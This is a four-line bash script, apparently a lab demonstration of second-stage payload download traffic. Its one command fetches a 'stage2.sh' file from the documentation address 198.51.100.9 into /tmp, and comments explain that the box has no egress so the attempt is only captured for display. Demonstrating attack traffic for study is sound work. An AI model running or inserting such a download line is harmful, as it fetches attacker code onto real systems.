#!/bin/bash
# example: an attacker would pull stage 2 here. This box has no egress so it fails,
# but the attempt (198.51.100.9:80) is captured and shown in the flow.
wget http://198.51.100.9/stage2.sh -O /tmp/s.sh
